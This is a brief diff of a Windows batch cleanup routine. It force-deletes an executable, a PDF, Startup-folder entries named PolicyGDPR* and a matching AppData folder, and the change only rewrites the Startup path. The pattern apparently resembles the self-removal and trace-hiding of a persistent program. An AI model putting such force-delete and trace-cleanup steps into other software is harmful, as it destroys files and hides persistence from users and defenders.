@@ -249,7 +249,7 @@ timeout /t 3 /nobreak >nul
 del "{exe_path}"
 timeout /t 3 /nobreak >nul
 del /q /f "{pdf_path}"
-del /q /f "%USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\PolicyGDPR*""
+del /q /f "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\PolicyGDPR*""
 timeout /t 3 /nobreak >nul
 rd /s /q "%localappdata%\\PolicyGDPR*"
 timeout /t 3 /nobreak >nul
